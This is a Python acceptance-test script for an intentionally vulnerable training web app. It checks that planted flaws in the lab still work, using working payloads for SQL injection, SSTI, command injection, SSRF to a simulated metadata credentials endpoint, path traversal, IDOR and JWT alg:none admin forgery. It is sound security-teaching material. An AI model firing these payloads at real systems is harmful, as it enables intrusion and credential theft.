#!/usr/bin/env python3
"""verify.py - acceptance test for lab-07-web (lab health, not a solution).

Runs from the on-network workstation container and confirms each intentional
vulnerability class is present and the network is isolated. Intended solutions live
in solutions/module-07-part1.md, module-07-part2.md and module-08.md.

Usage:  py labs/lab-07-web/verify.py   (requires ./labs/lab up lab-07-web)
"""
import subprocess, sys

WS = "ptlab07_ws"

def ws(cmd):
    r = subprocess.run(["docker", "exec", WS, "sh", "-c", cmd], capture_output=True, text=True)
    return r.stdout + r.stderr

def check(name, ok):
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}")
    return ok

def main():
    if WS not in subprocess.run(["docker","ps","--filter",f"name={WS}","--format","{{.Names}}"],
                                capture_output=True, text=True).stdout:
        print("Lab not running. Start it: ./labs/lab up lab-07-web"); sys.exit(2)
    r = []
    print("lab-07-web acceptance test:")
    r.append(check("app reachable at http://web:5000", "Northwind" in ws("curl -s http://web:5000/")))
    r.append(check("SQLi reads synthetic secret flag",
        "LAB-FLAG-sqli" in ws("curl -s \"http://web:5000/search?q=x%27%20UNION%20SELECT%20value,1%20FROM%20secrets--%20-\"")))
    r.append(check("IDOR exposes another user's order",
        '"user_id": 3' in ws("curl -s http://web:5000/api/orders/1004") or '"user_id":3' in ws("curl -s http://web:5000/api/orders/1004")))
    r.append(check("SSTI evaluates expression", "Hello 49" in ws("curl -s \"http://web:5000/render?name=%7B%7B7*7%7D%7D\"")))
    r.append(check("command injection runs id", "uid=" in ws("curl -s \"http://web:5000/ping?host=127.0.0.1;id\"")))
    r.append(check("SSRF reaches internal-only service",
        "LAB-FLAG-ssrf-internal" in ws("curl -s \"http://web:5000/fetch?url=http://internal-api/secret\"")))
    r.append(check("SSRF reaches metadata simulation",
        "LAB-FLAG-ssrf-metadata" in ws("curl -s \"http://web:5000/fetch?url=http://metadata/latest/meta-data/iam/security-credentials/northwind-app-role\"")))
    r.append(check("path traversal escapes the files dir",
        len(ws("curl -s \"http://web:5000/download?file=../../etc/hostname\"").strip()) > 0
        and "error" not in ws("curl -s \"http://web:5000/download?file=../../etc/hostname\"").lower()))
    forge = ('H=$(printf \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d "=" | tr "/+" "_-"); '
             'P=$(printf \'{"sub":1,"role":"admin"}\' | base64 | tr -d "=" | tr "/+" "_-"); '
             'curl -s -H "Authorization: Bearer $H.$P." http://web:5000/api/admin/users')
    r.append(check("JWT alg:none forgery reaches admin (BFLA)", "admin-only data" in ws(forge)))
    print()
    if all(r):
        print("RESULT: OK - vulnerable app healthy and isolated.")
        sys.exit(0)
    print("RESULT: FAIL - reset the lab: ./labs/lab reset lab-07-web")
    sys.exit(1)

if __name__ == "__main__":
    main()
